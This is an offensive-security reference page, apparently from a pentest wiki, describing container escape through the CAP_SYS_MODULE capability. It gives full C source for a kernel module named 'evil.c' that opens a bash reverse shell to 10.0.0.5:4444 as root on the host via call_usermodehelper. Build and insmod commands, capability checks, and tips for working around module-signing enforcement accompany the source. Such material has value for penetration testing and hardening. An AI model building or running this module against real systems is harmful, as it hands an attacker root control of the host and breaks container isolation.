---
title: "CAP_SYS_MODULE: loading a kernel module that executes on the host"
description: "CAP_SYS_MODULE lets a container call init_module and finit_module to insert arbitrary code into the host kernel. A short kernel module whose init function calls call_usermodehelper runs a chosen program as root in the host's init namespace, giving a reliable container escape that does not depend on cgroups or device access."
keywords:
  - cap_sys_module
  - init_module
  - kernel module
  - call_usermodehelper
  - container escape
---

# CAP_SYS_MODULE

`CAP_SYS_MODULE` permits the `init_module(2)` and `finit_module(2)` syscalls, which load code directly into the running host kernel. Because kernel modules share the host's single kernel regardless of namespaces, a module loaded from inside a container executes in ring 0 on the host. The standard escape is a tiny module whose init routine uses `call_usermodehelper` to spawn a user-space program in the host's init namespace, typically a reverse shell or a command that drops an SSH key.

Confirm the capability and that module tooling is present:

```bash
capsh --print | grep -o cap_sys_module
grep CapEff /proc/self/status          # bit 16 set
ls /usr/src/linux-headers-$(uname -r) 2>/dev/null || echo "need headers matching $(uname -r)"
```

## Building and loading the module

The module must be built against headers that match the host kernel release, since `vermagic` is checked at load time. Containers rarely ship headers, so cross-build on a matching kernel or install them in a throwaway builder.

```c
// evil.c
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kmod.h>

static char *cmd = "/bin/sh";
module_param(cmd, charp, 0);

static int __init evil_init(void) {
    char *argv[] = { "/bin/sh", "-c",
        "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1", NULL };
    char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    // UMH_WAIT_PROC: run to completion in the host init namespace as root
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    return 0;
}
static void __exit evil_exit(void) { }
module_init(evil_init);
module_exit(evil_exit);
MODULE_LICENSE("GPL");
```

```makefile
# Makefile
obj-m += evil.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
```

```bash
make                                   # produces evil.ko
insmod ./evil.ko                       # or: finit_module via a tiny loader
# the reverse shell fires immediately in evil_init, as root on the host
```

If `insmod` is not in the image, call the syscall directly: open the `.ko` and invoke `finit_module(fd, "", 0)` from a few lines of C, which avoids needing the kmod userspace tools.

## Exploitation notes

- `MODULE_LICENSE("GPL")` avoids a tainting refusal on some configurations; the module still loads without it but may log a taint warning.
- The reverse-shell command runs via `call_usermodehelper` in the host's init (PID 1) namespace set, so it is not confined by the container's namespaces or cgroups even though `insmod` was run inside the container.
- Secure Boot with enforced module signing (`CONFIG_MODULE_SIG_FORCE`) rejects an unsigned module; check `cat /sys/module/module/parameters/sig_enforce` and `dmesg | grep -i 'module verification'`. Where enforced, fall back to [CAP_SYS_ADMIN](cap-sys-admin.md) or [Host block device](device-access/host-block-device.md).
- This capability is included in `--privileged`; it is route 3 on [Privileged flag](privileged-flag.md).

## References

- [man 2 init_module](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [xcellerator: Linux kernel rootkit / call_usermodehelper](https://xcellerator.github.io/posts/linux_rootkits_11/)
- [HackTricks: CAP_SYS_MODULE](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_module)
